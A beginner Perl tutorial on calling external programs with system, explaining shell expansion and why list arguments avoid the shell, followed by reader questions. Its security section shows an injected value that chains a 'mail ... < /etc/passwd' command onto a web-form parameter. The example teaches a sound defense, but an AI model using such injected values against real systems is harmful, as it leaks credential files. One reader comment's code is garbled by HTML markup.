---
title: "Running external programs from Perl with system"
timestamp: 2013-06-03T22:22:22
tags:
  - system
published: true
books:
  - beginner
author: szabgab
---


In many cases Perl is used as a wrapper around other programs.
This means that we run those other programs from our Perl program.

For example we use Perl to collect the parameters needed by that program
to make it easier for us to create the correct command line to run the
other program.

In other cases we might want to capture the output of another command line
program and then make some decisions based on that output.

Perl provides us with many different solutions. We'll see some of them here.


## system

Probably the most simple one is called `system`. In its most basic
form in accepts a string that contains exactly what you would write on
the command line in order to invoke the external command.

For example on Unix/Linux machines there is a command called "adduser",
that can create a user account.
You could invoke it like this:

`/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo`

So if I'd like to run this from a perl script I can write the following:

```perl
  system('/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo');
```

This will run the adduser command. Any output or error the
adduser generates will end up on your screen.

You can also build up the command you'd like to execute.
The following two examples give you the same results.

```perl
  my $cmd = '/usr/sbin/adduser --home /opt/bfoo --gecos "Foo Bar" bfoo';
  system($cmd);
```

```perl
  my $cmd = '/usr/sbin/adduser';
  $cmd .= ' --home /opt/bfoo';
  $cmd .= ' --gecos "Foo Bar" bfoo';
  system($cmd);
```


## system with multiple arguments

The `system` function can receive more than one arguments.
The above example could have been written like this:
```perl
  my @cmd = ('/usr/sbin/adduser');
  push @cmd, '--home';
  push @cmd, '/opt/bfoo';
  push @cmd, '--gecos',
  push @cmd, 'Foo Bar',
  push @cmd, 'bfoo';
  system(@cmd);
```

In this case all the above solutions provide the same result, but it
is not always the case.

## Shell expansion

Let's say you have a program called **checkfiles** that can check the files
listed on its command line. You could call it **checkfiles data1.txt data2.txt**
or **checkfiles data*.txt** to check all the files that has a name staring 
with the 4 letters 'data', followed by some other characters and
having the 'txt' extension.
This second way of running the program would work on Unix/Linux systems where
the shell expands the 'data*.txt' to all the files that match the description.
When the program **checkfiles** is executed it already sees the list of files:
**checkfiles data1.txt data2.txt data42.txt database.txt**.
Not so of Windows, where the command line does not do this expansion.
On Windows the program will get 'data*.txt' as input.

What has it to do with your Perl script? You ask.

On Windows it won't matter.
On Unix/Linux however, if you run the 'checkfiles' program from within a Perl script
as one string: `system("checkfiles data*.txt")`, then Perl will pass
that string to the shell. The shell will do its expansion and the 'checkfiles' program
will see the list of file. On the other hand, if you pass the command and parameters
as separate strings: `system("checkfiles", "data*.txt")` then perl will run the
'checkfiles' program directly and pass the single parameter 'data*.txt' to it without
any expansion.

As you can see, passing the whole command as a single string has its advantages.

This advantage comes with a price though.

## The security risk

Calling system with a single parameter and passing the whole command that way,
can be a security hazard if the input can come from untrusted sources. For example
directly from a web form. Or from the log file created by a web server.

Let's say you accept the parameter of checkfiles from an untrusted source:

```perl
  my $param = get_from_a_web_form();
  my $cmd = "checkfiles $param";
  system($cmd);
```

If the user types in 'data*.txt' then you are ok. The `$cmd` will contain
`checkfile data*.txt`.

On the other hand if the user passes in some other, more 'clever' parameters then you might
be in trouble. For example if the user types in
`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`.
Then the command perl executes will look like this:
`checkfile data*.txt; mail darkside@perlmaven.com &lt; /etc/passwd`.

The shell will first execute the 'checkfile data*.txt' command as you intended, but then
it will go on, and also execute the 'mail...' command.
That will send your password file to my darker side.

If your Perl script was using `system` with multiple parameters, this security
risk is avoided. If this is the Perl code:

```perl
  my $param = get_from_a_web_form();
  my @cmd = ("checkfiles", $param);
  system(@cmd);
```

And the user types in `data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`.
the Perl script will run the 'checkfiles' program and pass a single argument to it:
`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`. No shell expansion
but we also avoided the dangers of the shell.
The 'checkfiles' program will probably complain that it cannot find a file called
`data*.txt; mail blackhat@perlmaven.com &lt; /etc/passwd`, but at least our passwords
will be safe.

## Conclusion and further reading

It is more convenient to make one string out of the command and pass that to `system`,
but if the input comes from an untrusted source, this can easily become an attack vector.
The risk can be reduced by first checking the input against a **white list** of acceptable
input characters. You can force yourself to think about these issues by enabling the
**taint mode** using the `-T` flag on the sh-bang line.

You can read more in the [documentation of system](/perldoc/system).

## Comments


when running this command
system ('unoconv -f pdf testpdf_1.ods'); I get the error No such file or directory. However if I run the command from terminal it works. The .ods file is in the same dir as perl script and I have checked $CWD and the working dir is the dir the script is in. Any ideas as how I would debug this.

---

I'm facing the same exact problem. Did you figure out a way around this?

<hr>

Hi,
I am trying to run the windows executable from perl script under linux.
#!/usr/bin/perl -w
use strict;
use warnings;

my $cmd = ("./astrip.exe");

system($cmd);

output:
./astrip.exe: 1: ./astrip.exe: MZ▒▒▒▒@▒▒▒: not found
./astrip.exe: 2: ./astrip.exe: Syntax error: ")" unexpected

the out is same for other executable also...

May I know what is problem with the script or environment or perl version?

---

Can you run that exe file on Linux directly from the command line?
---
tools# ./astrip.exe
bash: ./astrip.exe: cannot execute binary file: Exec format error

I cannot run the exe from command line.. here is the error its throwing.

---

Then why do you expect it to run from Perl?

Anyway, as I can understand you are trying to run a Windows exe file on Linux. You cannot do that and it has nothing to do with Perl.

---

Actually I was expecting the same output from perl system call,
"bash: ./astrip.exe: cannot execute binary file: Exec format error" but here the error is different, so trying to understand what is this error? If we can't run a windows exe from linux then I would expect Execute format error...

---

"an exe file is for Windows. Don't expect it to run on Linux". Instead of this rant.

<hr>

do you have any Perl script to check packages installed in Linux ?

<hr>

I am setting one environment variable in perl.
But the same is not accessible/available from the shell where I launched the script.
Is this because the perl script will set the Env variable on different (say local) instance of shell ?
If so any work around ?

---
You know, you'll have to show how you do things and one what OS are you running. Otherwise people can only guess.
---

Sorry for that.

Please see below script.


use strict;

# Scenario 1
my $out1 = `export MY1=Hello; echo \$MY1`;
print "\nOUT 1 = $out1\n";


# Scenario 2
`export MY2=Hello;`;
my $out2 = `echo \$MY2`;
print "\nOUT 2 = $out2\n";

 

The output look like :
======================

OUT 1 = Hello

OUT 2 =

======================

So why in 2nd scenario it is not showing the value of ENV variable MY2 ?
The same is for the tcsh shell where I run the script, there also the internally set ENV variables are not available.

The system is RED HAT linux.

Please let me know if you require more information.

---

Because any env-vars you set in a subprocess (the thing you crearte when running with backtick), are gone when the subprocess ends. The same is true in every programming language. If you set it using $ENV{MY1} = 'Hello'; in your Perl program, before using the backtick, it would work.

---
hanks Gabor.

It is working with it.
One more query, please see below script :

use strict;

$ENV{MY2}="Hello";

So with this we are setting the ENV variable MY2, which is accessible/available with in the perl script, but it is not available in the shell (tcsh) , from where the script was launched.

for example this is what is happening after running the script :

[Sunny]$ perl my.pl
[Sunny]$ echo $MY2
MY2: Undefined variable.

====================
So the question is "is there any way to retain the ENV variable setting done in script ?"
I thought of writing it to shell script and running the script in perl, but as you said it ran on sub-process with back-ticks and didn't work.

<hr>


 am very new to Perl scripting. I am trying to do SFTP using Perl Script and able to login into Host machine using perl script. But when I try changing the directory on Host machine its not do it. Here are the commands I used,

$ftp=Net::SFTP::Foreign->new($host,%args) or $newerr=1;
$ftp->setcwd($hostgetdir) or $newerr=1;
print
"===================\n",
getcwd(), "\n",
"Done!\n",
"===================\n";

This is changing it to local directory but not on the Host Machine. Please help what command i have to use.


----

Can you please let me know what is the command to use to change directory using Perl Script in SFTP environment on Host Machine.

<hr>
where is comparison with `$cmd`
and parsing of command?

<hr>

Under Windows when I run system with e.g. sort on a file which I've just written I almost get an "The process cannot access the file because it is being used by another process.".

At first I create the file (~ 1-7 MB) which always works without problems.

Note: Under Windows you have to use O_APPEND if you plan to truncate it after exclusive lock.

sysopen(my $fh, $file, O_WRONLY | O_CREAT | O_APPEND ) or die $!;
flock($fh, LOCK_EX) or die $!;
truncate($fh, 0) or die $!;
binmode($fh, ":raw") or die $!;
... many writes
close($fh) or die $!;

After that I call system sort:

my @Args;
push(@Args, "sort");
push(@Args, "/REC");
push(@Args, 57);
push(@Args, "/unique");
push(@Args, $file);
push(@Args, "/O");
push(@Args, $fileout);

unless (system(@Args) == 0)
{ die("Sytem call [" . join(" ", @Args) . "] failed with" . $?); }

and dies with the error.

The file have been closed without any error and next is system call and fails that it is used? The output file doesn't exist of course.

I'm running a parent and fork up to 8 sub processes which creates a file and sort it. Totally ~1280 files will be created and for more then 60-70 % of the system call fail. Most of the time at least the 4th call works.

I'm using Windows 10 64-bit with Strawberry Perl 5.30.2.1-64bit. It doesn't depend on the disk (external USB 3 or internal C: .m2).

I'm programming Perl for over 20 years but I have no idea why this happens.

----


Do the subprocesses all work on different files? If not, then on subprocess might be writing while the other tries to sort.

---

Hi Gabor, all different file names of course. The file name includes the task number of 0 .. 1280. The parent forks up to 8 tasks and continues with the next if one is finished.

When I re-open the file within Perl itself with exclusive mode - sysopen,flock,close - instead of the system call, all works fine and there are no errors.

----
I would put in a sleep after the close, as my next experiment to make it work.

---

Of course I had to do it. I run a loop over the system call - if it fails I sleep one second and try it again. And after 1-4 trials it had worked.

I just configured the max number of forked processes to 1 ... and no error happens. Increased it to 2 - error happens.

Buggy Perl implementation under Windows with fork and system call?

---

Maybe, but I am not sure. I think I saw similar behaviour in Python on Windows as well.

BTW, does the error message you get include the name of the file?
---

No - but it can be only the file just written. The output file doesn't exist. As I wrote above - it looks like it happen only when I run more then one process.

---

I just also tested with sort to use an own temporary directory for each task/call (0..1280) - but the error also happens. I've thought maybe the same temporary file name for sort might be created - if one - but it doesn't happen.

---


I just tested to unlock before closing the file - it doesn't help.

<hr>

How can run the following piece of unix ftp code in perl:

$FTP -ni $TCSVR > /dev/null << EndFTP
user anonymous $user@cadence.com
cd $destDir
lcd $dirName
binary
mput $remote_file
bye

<hr>

calling

system("cat <file name="">|perl -pe 's/<string>/<string. g'");<="" i="">

in a perl script is producing different results, then calling

:>less <file name=""> |perl -pe 's/<string>/<string>/g'

from a RedHat command line, any clue on why this might be happening?

---

Well, both seem to be bad solution. Why would you want to run a shell command to run another perl command from perl?

